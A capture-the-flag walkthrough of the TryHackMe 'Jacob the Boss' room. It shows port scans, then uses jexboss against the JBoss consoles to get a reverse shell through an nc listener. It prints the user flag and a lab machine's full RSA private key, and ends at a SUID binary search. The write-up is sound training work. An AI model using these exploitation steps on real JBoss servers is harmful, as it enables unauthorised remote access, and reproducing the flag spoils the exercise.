<h1 align="center">Jacob the Boss</h1>
<p align="center">2025, August 7<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m excited to join you on this adventure, part of my <code>458</code>-day-streak in <a href="https://tryhackme.com">TryHackMe</a>.<br>
<em>Find a way in and learn a little more.</em>.<br>
<img width="80px" src="https://github.com/user-attachments/assets/8a157d7c-b065-489b-8b21-f309d36061d4"><br>
Access this walkthrough room clicking <a href="https://tryhackme.com/room/jacobtheboss">here </a>.<br>
<img width="1200px" src=""></p>



<br>


<h2>Task 1 . GO on, it´s your machine!</h2>
<p>Well, the flaw that makes up this box is the reproduction found in the production environment of a customer a while ago, the verification in season consisted of two steps, the last one within the environment, we hit it head-on and more than 15 machines were vulnerable that together with the development team we were able to correct and adapt.<br>

*First of all, add the jacobtheboss.box address to your hosts file.<br>

Anyway, learn a little more, have fun!</p>



<p><em>Answer the question below</em></p>

<p>1.1. user.txt?<br>
<code>____</code></p>

<br>

<p>1.2. root.txt?<br>
<code>____</code></p>


```bash
~# nmap -sT 10.201.99.76
Starting Nmap 7.80 ( https://nmap.org ) at 2025-08-08 00:42 BST
Nmap scan report for ip-10-201-99-76.ec2.internal (10.201.99.76)
Host is up (0.00061s latency).
Not shown: 987 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
111/tcp  open  rpcbind
1090/tcp open  ff-fms
1098/tcp open  rmiactivation
1099/tcp open  rmiregistry
3306/tcp open  mysql
4444/tcp open  krb524
4445/tcp open  upnotifyp
4446/tcp open  n1-fwp
8009/tcp open  ajp13
8080/tcp open  http-proxy
8083/tcp open  us-srv

```

<h3>JBoss</h3>

```bash
:~# nmap -sC -sV -Pn 10.201.99.76
Starting Nmap 7.80 ( https://nmap.org ) at 2025-08-08 00:42 BST
Nmap scan report for ip-10-201-99-76.ec2.internal (10.201.99.76)
Host is up (0.00021s latency).
Not shown: 987 closed ports
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 82:ca:13:6e:d9:63:c0:5f:4a:23:a5:a5:a5:10:3c:7f (RSA)
|   256 a4:6e:d2:5d:0d:36:2e:73:2f:1d:52:9c:e5:8a:7b:04 (ECDSA)
|_  256 6f:54:a6:5e:ba:5b:ad:cc:87:ee:d3:a8:d5:e0:aa:2a (ED25519)
80/tcp   open  http        Apache httpd 2.4.6 ((CentOS) PHP/7.3.20)
|_http-server-header: Apache/2.4.6 (CentOS) PHP/7.3.20
|_http-title: My first blog
111/tcp  open  rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|_  100000  3,4          111/udp6  rpcbind
1090/tcp open  java-rmi    Java RMI
|_rmi-dumpregistry: ERROR: Script execution failed (use -d to debug)
1098/tcp open  java-rmi    Java RMI
1099/tcp open  java-object Java Object Serialization
| fingerprint-strings: 
|   NULL: 
|     java.rmi.MarshalledObject|
|     hash[
|     locBytest
|     objBytesq
|     http://jacobtheboss.box:8083/q
|     org.jnp.server.NamingServer_Stub
|     java.rmi.server.RemoteStub
|     java.rmi.server.RemoteObject
|     xpw;
|     UnicastRef2
|_    jacobtheboss.box
3306/tcp open  mysql       MariaDB (unauthorized)
4444/tcp open  java-rmi    Java RMI
4445/tcp open  java-object Java Object Serialization
4446/tcp open  java-object Java Object Serialization
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
| ajp-methods: 
|   Supported methods: GET HEAD POST PUT DELETE TRACE OPTIONS
|   Potentially risky methods: PUT DELETE TRACE
|_  See https://nmap.org/nsedoc/scripts/ajp-methods.html
8080/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
| http-methods: 
|_  Potentially risky methods: PUT DELETE TRACE
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache-Coyote/1.1
|_http-title: Welcome to JBoss&trade;
8083/tcp open  http        JBoss service httpd
|_http-title: Site doesn't have a title (text/html).
3 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port1099-TCP:V=7.80%I=7%D=8/8%Time=689539EC%P=x86_64-pc-linux-gnu%r(NUL
SF:L,16F,"\xac\xed\0\x05sr\0\x19java\.rmi\.MarshalledObject\|\xbd\x1e\x97\
SF:xedc\xfc>\x02\0\x03I\0\x04hash\[\0\x08locBytest\0\x02\[B\[\0\x08objByte
SF:sq\0~\0\x01xp\x86\xbc\$\x90ur\0\x02\[B\xac\xf3\x17\xf8\x06\x08T\xe0\x02
SF:\0\0xp\0\0\0\.\xac\xed\0\x05t\0\x1dhttp://jacobtheboss\.box:8083/q\0~\0
SF:\0q\0~\0\0uq\0~\0\x03\0\0\0\xc7\xac\xed\0\x05sr\0\x20org\.jnp\.server\.
SF:NamingServer_Stub\0\0\0\0\0\0\0\x02\x02\0\0xr\0\x1ajava\.rmi\.server\.R
SF:emoteStub\xe9\xfe\xdc\xc9\x8b\xe1e\x1a\x02\0\0xr\0\x1cjava\.rmi\.server
SF:\.RemoteObject\xd3a\xb4\x91\x0ca3\x1e\x03\0\0xpw;\0\x0bUnicastRef2\0\0\
SF:x10jacobtheboss\.box\0\0\x04J\0\0\0\0\0\0\0\0\xe8\xf5\xa1c\0\0\x01\x98\
SF:x86\xbb\xf1\x9b\x80\0\0x");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port4445-TCP:V=7.80%I=7%D=8/8%Time=689539F2%P=x86_64-pc-linux-gnu%r(NUL
SF:L,4,"\xac\xed\0\x05");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port4446-TCP:V=7.80%I=7%D=8/8%Time=689539F2%P=x86_64-pc-linux-gnu%r(NUL
SF:L,4,"\xac\xed\0\x05");
MAC Address: 16:FF:D8:5B:BC:7D (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.10 seconds
```


```bash
:~# nikto -h j.thm
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          10.201.99.76
+ Target Hostname:    j.thm
+ Target Port:        80
+ Start Time:         2025-08-08 01:02:48 (GMT1)
---------------------------------------------------------------------------
+ Server: Apache/2.4.6 (CentOS) PHP/7.3.20
+ Retrieved x-powered-by header: PHP/7.3.20
+ Server leaks inodes via ETags, header found with file /, fields: 0x0b2872b0cfaa1649d61ab0adfb5a81fc 
+ The anti-clickjacking X-Frame-Options header is not present.
+ DEBUG HTTP verb may show server debugging information. See http://msdn.microsoft.com/en-us/library/e8z01xdh%28VS.80%29.aspx for details.
+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
+ OSVDB-3268: /public/: Directory indexing found.
+ OSVDB-3092: /public/: This might be interesting...
+ Uncommon header 'x-frame-options' found, with contents: SAMEORIGIN
+ OSVDB-3093: /admin/auth.php: This might be interesting... has been seen in web logs from an unknown scanner.
+ OSVDB-3268: /icons/: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ 6544 items checked: 0 error(s) and 11 item(s) reported on remote host
+ End Time:           2025-08-08 01:03:08 (GMT1) (20 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```


```bash
:~# dirsearch -u http://jacobtheboss.box/ -x 403
...
[00:44:01] Starting: 
[00:44:14] 301 -  227B  - /admin  ->  http://j.thm/admin/
[00:44:15] 302 -    0B  - /admin/  ->  http://j.thm/admin/auth.php
[00:44:16] 302 -    0B  - /admin/index.php  ->  http://j.thm/admin/auth.php
[00:44:31] 200 -   46KB - /CHANGELOG
[00:44:34] 200 -  427B  - /CONTRIBUTING.md
[00:44:34] 200 -  817B  - /CREDITS
[00:44:51] 200 -   18KB - /LICENSE
[00:45:08] 301 -  228B  - /public  ->  http://j.thm/public/
[00:45:08] 200 -  675B  - /public/
[00:45:09] 200 -    4KB - /README.md
[00:45:22] 200 -    2KB - /themes/
[00:45:22] 301 -  228B  - /themes  ->  http://j.thm/themes/

Task Completed
root@ip-10-201-59-173:~# 

```


<img width="1019" height="547" alt="image" src="https://github.com/user-attachments/assets/0bf121cb-fbe6-4bd2-9590-f452b69c55ea" />


<img width="733" height="397" alt="image" src="https://github.com/user-attachments/assets/4ce2661a-1716-4ae1-93ce-cbdc4b8f0e89" />

<img width="1018" height="630" alt="image" src="https://github.com/user-attachments/assets/95dff5b2-51b0-41ed-963f-010b437dd60c" />

<br>

```bash

git clone https://github.com/joaomatosf/jexboss.git
root@ip-10-201-59-173:~# cd jexboss
:~/jexboss# pip install -r requires.txt


* Checking for updates in: http://joaomatosf.com/rnp/releases.txt **


 ** Checking Host: http://10.201.99.76:8080 **

 [*] Checking admin-console:                  [ OK ]
 [*] Checking Struts2:                        [ OK ]
 [*] Checking Servlet Deserialization:        [ OK ]
 [*] Checking Application Deserialization:    [ OK ]
 [*] Checking Jenkins:                        [ OK ]
 [*] Checking web-console:                    [ VULNERABLE ]
 [*] Checking jmx-console:                    [ VULNERABLE ]
 [*] Checking JMXInvokerServlet:              [ VULNERABLE ]


 * Do you want to try to run an automated exploitation via "web-console" ?
   If successful, this operation will provide a simple command shell to execute 
   commands on the server..
   Continue only if you have permission!
   yes/NO? yes

 * Sending exploit code to http://10.201.99.76:8080. Please wait...

 * Please enter the IP address and tcp PORT of your listening server for try to get a REVERSE SHELL.
   OBS: You can also use the --cmd "command" to send specific commands to run on the server.
   IP Address (RHOST): 10.201.59.173
   Port (RPORT): 4444

 * The exploit code was successfully sent. Check if you received the reverse shell
   connection on your server or if your command was executed. 
   Type [ENTER] to continue...
```



```bash
:~/JacobTheBoss# nc -nlvp 4444
Listening on 0.0.0.0 4444
Connection received on 10.201.99.76 50640
bash: no job control in this shell
[jacob@jacobtheboss /]$ whoami
whoami
jacob
[jacob@jacobtheboss /]$ pwd
pwd
/
[jacob@jacobtheboss /]$ cat /home/jacob/user.txt
cat /home/jacob/user.txt
f4d491f280de360cc49e26ca1587cbcc
[jacob@jacobtheboss /]$ 
....


:~/JacobTheBoss# nc -nlvp 6666
Listening on 0.0.0.0 6666
Connection received on 10.201.99.76 35108
bash: no job control in this shell
[jacob@jacobtheboss /]$ ssh-keygen
ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/home/jacob/.ssh/id_rsa): 
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Created directory '/home/jacob/.ssh'.
Your identification has been saved in /home/jacob/.ssh/id_rsa.
Your public key has been saved in /home/jacob/.ssh/id_rsa.pub.
The key fingerprint is:
SHA256:IyaGUYG/vvg+ieN5QikHwolpFaZoS1ycpZN2Z1yqP2k jacob@jacobtheboss.box
The key's randomart image is:
+---[RSA 2048]----+
|  .=*o   .       |
|o ==o . o        |
|+*+* . =         |
|B+oo+ +          |
|oo..ooo S        |
|. +..o....       |
| + o . E         |
|  +o= . .        |
| .+*+o           |
+----[SHA256]-----+
[jacob@jacobtheboss /]$ ls
ls
bin
boot
dev
etc
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
swapfile
sys
tmp
usr
var
[jacob@jacobtheboss /]$ ls -lah
ls -lah
total 2.1G
dr-xr-xr-x.  17 root root  240 Jul 30  2020 .
dr-xr-xr-x.  17 root root  240 Jul 30  2020 ..
lrwxrwxrwx.   1 root root    7 Jun  1  2019 bin -> usr/bin
dr-xr-xr-x.   5 root root 4.0K Jul 31  2020 boot
drwxr-xr-x.  18 root root 2.9K Aug  7 22:51 dev
drwxr-xr-x.  85 root root 8.0K Aug  7 22:51 etc
drwxr-xr-x.   3 root root   19 Jul 30  2020 home
lrwxrwxrwx.   1 root root    7 Jun  1  2019 lib -> usr/lib
lrwxrwxrwx.   1 root root    9 Jun  1  2019 lib64 -> usr/lib64
drwxr-xr-x.   2 root root    6 Apr 11  2018 media
drwxr-xr-x.   2 root root    6 Apr 11  2018 mnt
drwxr-xr-x.   2 root root    6 Apr 11  2018 opt
dr-xr-xr-x. 115 root root    0 Aug  7 22:51 proc
dr-xr-x---.   4 root root  252 Jul 31  2020 root
drwxr-xr-x.  26 root root  760 Aug  7 22:51 run
lrwxrwxrwx.   1 root root    8 Jun  1  2019 sbin -> usr/sbin
drwxr-xr-x.   4 root root   31 Jul 31  2020 srv
-rw-------.   1 root root 2.0G Jun  1  2019 swapfile
dr-xr-xr-x.  13 root root    0 Aug  7 22:51 sys
drwxrwxrwt.  11 root root 4.0K Aug  8 00:08 tmp
drwxr-xr-x.  13 root root  155 Jun  1  2019 usr
drwxr-xr-x.  19 root root  265 Jul 30  2020 var
[jacob@jacobtheboss /]$ cd home
cd home
[jacob@jacobtheboss home]$ ls
ls
jacob
[jacob@jacobtheboss home]$ cd jacob 
cd jacob
[jacob@jacobtheboss ~]$ ls
ls
user.txt
[jacob@jacobtheboss ~]$ ls -lah
ls -lah
total 20K
drwx------. 3 jacob jacob 111 Aug  8 00:22 .
drwxr-xr-x. 3 root  root   19 Jul 30  2020 ..
-rw-------. 1 jacob jacob 174 Aug  8 00:18 .bash_history
-rw-r--r--. 1 jacob jacob  18 Apr  1  2020 .bash_logout
-rw-r--r--. 1 jacob jacob 193 Apr  1  2020 .bash_profile
-rw-r--r--. 1 jacob jacob 231 Apr  1  2020 .bashrc
drwx------. 2 jacob jacob  38 Aug  8 00:22 .ssh
-rw-r--r--. 1 jacob jacob  33 Jul 31  2020 user.txt
[jacob@jacobtheboss ~]$ cd .ssh
cd .ssh
[jacob@jacobtheboss .ssh]$ ls
ls
id_rsa
id_rsa.pub
[jacob@jacobtheboss .ssh]$ cat id_rsa
cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA1hkk+a8tyHkh6mUu5hhhUHD+IGeebbs4CllMXCkbywShn3vv
Ak+FD6jjVd10Jx7ZSdoa70K8YLoCW9hW+10czSfgO7Z//IPue/Q5Y4p6b7e/SRQU
ztioD5L/kWd52wNFu75tgQz6+Dz6ZsrTfLkjoQJoIq4GLAktEDexEl+7bhHmmCOi
m21aIUghVxr1nrtPqaaZ+dg1u28nrVbAanMb/jCBTRWFF3kcu9CsVdXbQOeUdr6o
xRY3CLwAvdeIMZZ3Wb8AeqUCOsd+GrpZt8S0wGmXjhUJvSKeEzcCQXgmyIiAiZQ1
fVmSzEAnk59SFH2Ng0piBiqp+bDJk7KGcnw08wIDAQABAoIBAGHGtfY5pKULfQu5
DgQTWk4MbGKML/RZLiy7v33PYFwFT3KwfOUHP/N44+nQ6zz6f62Up/xg8/sQuAcN
9Btz2LVw4p0iqay+6+k8DgGBuozO09MiEqasl4QVVBYptaLqCazGOOhY7zzzTEAp
nRA21SixGrHL3BG8VxIy/PExOz32pPZuYin9hevkoWL8r3im5iMR114V05RZsX7o
ZatWvlipIHqjoikRgcv2FAq8VuYenVULUiU+CL52sQr+fQie19HicbO48VB1a7bu
tgGCJ3qUc7J8vUC7OwHBb2nC2fPhSv5Xi7O+leGUYLlTQF9IftWcD8wwyQ0gWQUZ
d/Rbs7ECgYEA8OTXvCTmGsaMK0wlktNi0KF1+vIQ3mnbRdyFvoxfBB+NTmUNTbzW
sRuVm1oXbORa8mwbFOapiGitneLPAPZBXZ2j48P/H3IP0tuS2Ot2O3ONVMvCFMDp
ZwGXPFovmPe1JSEjxFWRkTgEhP5UJ14+MHAjf19vbqeFNIZDN+MQT9UCgYEA44Yk
BQvfFy0ScOfSLTjgP09sAvNX3ECdOT4GmOddJBshgQ0eQoBkOwfYq1RABD7W4Va9
ligD+Q08OApfCTcXTssOB3c2FeLz4fNVlImFZQXM3Mu6m6Rghz0sdvakkp3Nmg4u
J1RXafHjp0F9GoHk2gU4L2gH4C2IeD/t4vYZHacCgYEAwe0IO79cuttxxf1kFiI0
X45L4zxyFgsT6dbQmIh6iWA5Ko4xOo62KxfwxYKubwwapyQeXSIgAt96PSt0x+p2
zr10TYzgWllBodcADb7ojI3GjigGUxzGCRV/wac8wCFR49Uc7RaRvF1jTglMh/DX
kbkE6qpSk7sqghFAFcKmxA0CgYA0LfFYzu4s7INMLX5ALMkQ++/zhUdjFdZ46Eav
DnCH9Ujrxcxox/U0rIn+UOYVkyvIphH4u9idZ3GmEIrXHDFWOq9O+wIGZvQzn5DC
7f8PuhLPmFGFnF8e5OKrrcj0bwhWCmZ/UpJxk634D8bXK28GqSfHh3425XpkyZSO
9o2wBQKBgGgu5cewo7RChfH6r6SXy8xFoMN8zVnC8dETsl5x/FI1WIcZioZFgrim
dtD3a4NybAVCyu1wZAEfPRj999gWVRrWiw5w6YgURVH1/PIqW9ORaD2iYbyS6LF3
Jq/1ey2WD9JHE2ySq79N9qz8A5cLJ8DPDR7Xryct7gZGGfJlrYBy
-----END RSA PRIVATE KEY-----
[jacob@jacobtheboss .ssh]$ 


```



find / -perm -u=s 2>/dev/null
 Failed to check for updates
/usr/bin/pingsys
/usr/bin/fusermount
/usr/bin/gpasswd
/usr/bin/su
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/mount
/usr/bin/chage
/usr/bin/umount
/usr/bin/crontab
/usr/bin/pkexec
/usr/bin/passwd
/usr/sbin/pam_timestamp_check
/usr/sbin/unix_chkpwd
/usr/sbin/usernetctl
/usr/sbin/mount.nfs
/usr/lib/polkit-1/polkit-agent-helper-1
/usr/libexec/dbus-1/dbus-daemon-launch-helper
